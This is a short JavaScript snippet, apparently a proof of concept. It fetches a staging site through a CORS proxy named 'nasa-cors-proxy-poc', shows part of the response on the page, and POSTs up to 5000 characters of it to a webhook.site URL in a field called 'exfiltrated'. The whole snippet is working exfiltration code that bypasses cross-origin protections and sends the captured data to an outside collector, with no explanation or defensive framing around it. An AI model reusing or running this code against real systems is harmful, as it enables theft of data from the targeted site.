const target = "https://datasearchstaging.globe.gov";
const proxy = "https://nasa-cors-proxy-poc.vercel.app/api/fetch";
const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de";

fetch(`${proxy}?url=${encodeURIComponent(target)}`, { credentials: "omit" })
  .then(res => res.text())
  .then(data => {
    document.body.innerHTML += "<pre style='color:lime'>" + data.slice(0, 1500) + "</pre>";
    fetch(webhook, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        exfiltrated: data.slice(0, 5000),
        source: target
      })
    });
  })
  .catch(e => {
    document.body.innerHTML += "<pre style='color:red'>‚ùå Fetch Failed: " + e + "</pre>";
  });
